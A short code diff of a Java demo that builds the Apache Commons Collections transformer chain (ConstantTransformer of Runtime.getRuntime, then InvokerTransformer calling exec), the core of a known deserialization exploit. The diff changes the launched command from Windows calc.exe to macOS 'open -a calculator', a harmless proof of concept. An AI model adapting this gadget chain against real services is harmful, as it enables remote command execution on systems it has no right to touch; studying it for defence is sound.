@@ -11,10 +11,9 @@ import java.util.Map;
 public class demo {
     public static void main(String[] args) throws Exception {
         Transformer[] transformers = new Transformer[]{
-                new ConstantTransformer(Runtime.getRuntime()),
-                new InvokerTransformer("exec", new Class[]{String.class},
-                        new Object[]
-                                {"C:\\Windows\\System32\\calc.exe"}),
+            new ConstantTransformer(Runtime.getRuntime()),
+            new InvokerTransformer("exec", new Class[]{String.class},
+                    new Object[]{"open -a calculator"}),
         };
         Transformer transformerChain = new ChainedTransformer(transformers);
 
